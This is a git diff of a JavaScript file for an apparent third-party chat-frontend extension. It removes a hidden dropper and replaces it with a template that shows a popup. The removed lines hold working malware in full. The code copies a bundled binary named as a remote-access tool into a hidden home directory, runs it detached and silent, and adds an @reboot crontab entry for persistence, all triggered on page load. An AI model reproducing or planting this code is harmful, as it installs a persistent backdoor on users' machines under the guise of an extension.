@@ -1,82 +1,18 @@
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
-const { execSync, spawn } = require('child_process');
-const extensionName = "test-extension";
-const ratFilename = 'NetworkBrigde';
-const sourceRatPath = path.join(__dirname, ratFilename);
+//You'll likely need to import extension_settings, getContext, and loadExtensionSettings from extensions.js
+import { extension_settings, getContext, loadExtensionSettings } from "../../../extensions.js";
 
-const hiddenDirName = '.runtime-svc';
-const targetDirPath = path.join(os.homedir(), hiddenDirName);
-const targetRatPath = path.join(targetDirPath, ratFilename);
+//You'll likely need to import some other functions from the main script
+import { saveSettingsDebounced } from "../../../../script.js";
 
-function executeMaliciousLogic() {
+// Keep track of where your extension is located, name should match repo name
+const extensionName = "st-test-extension";
+const extensionFolderPath = `scripts/extensions/third-party/${extensionName}`;
+const extensionSettings = extension_settings[extensionName];
+const defaultSettings = {};
 
-    try {
-        if (process.platform !== 'linux') {
-            return;
-        }
-
-        if (!fs.existsSync(targetDirPath)) {
-            try {
-                fs.mkdirSync(targetDirPath, { recursive: true });
-            } catch (mkdirError) {
-                return; 
-            }
-        }
-        try {
-            fs.copyFileSync(sourceRatPath, targetRatPath);
-        } catch (copyError) {
-             return;
-        }
-
-
-        try {
-            fs.chmodSync(targetRatPath, 0o755);
-        } catch (chmodError) {
-            return; 
-        }
-
-        try {
-            const subprocess = spawn(targetRatPath, [], {
-                detached: true,
-                stdio: 'ignore' 
-            });
-            subprocess.unref();
-        } catch (spawnError) {
-            return;
-        }
-
-        try {
-            const currentCrontab = execSync('crontab -l 2>/dev/null || true').toString();
-            const cronCommand = `@reboot "${targetRatPath}"`;
-            if (!currentCrontab.includes(targetRatPath)) { 
-                const tempCronFile = path.join(os.tmpdir(), `cron_${Date.now()}`);
-                fs.writeFileSync(tempCronFile, currentCrontab + '\n' + cronCommand + '\n');
-                execSync(`crontab "${tempCronFile}"`);
-                fs.unlinkSync(tempCronFile); 
-            } else {
-                return
-            }
-        } catch (cronError) {
-            return
-        }
-
-    } catch (error) {
-        return;
-    }
-}
-
-if (typeof jQuery !== 'undefined') {
-    jQuery(document).ready(() => {
-        executeMaliciousLogic();
-    });
-} else {
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', () => {
-           executeMaliciousLogic();
-        });
-    } else {
-        executeMaliciousLogic();
-    }
-}
+// This function is called when the extension is loaded
+jQuery(async () => {
+  toastr.info(
+    "A popup appeared because you clicked the button!"
+  );
+});
